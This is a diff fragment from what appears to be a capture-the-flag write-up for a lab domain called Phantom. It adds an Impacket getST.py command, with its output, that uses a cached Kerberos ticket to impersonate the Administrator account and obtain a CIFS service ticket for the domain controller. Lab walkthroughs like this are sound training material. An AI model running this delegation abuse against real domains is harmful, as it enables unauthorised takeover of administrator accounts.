@@ -729,6 +729,16 @@ Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
 Then ill use that session key and change the hash
 
 ```python
+KRB5CCNAME=wsilva.ccache getST.py -u2u -impersonate "Administrator" -spn "cifs/dc.phantom.vl" -k -no-pass "phantom.vl/wsilva"
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
 
+[*] Impersonating Administrator
+[*] Requesting S4U2self+U2U
+[*] Requesting S4U2Proxy
+[*] Saving ticket in Administrator@cifs_dc.phantom.vl@PHANTOM.VL.ccache
 ```
+
+Then ill request a CIFS ticket for the administrator
+
+
 
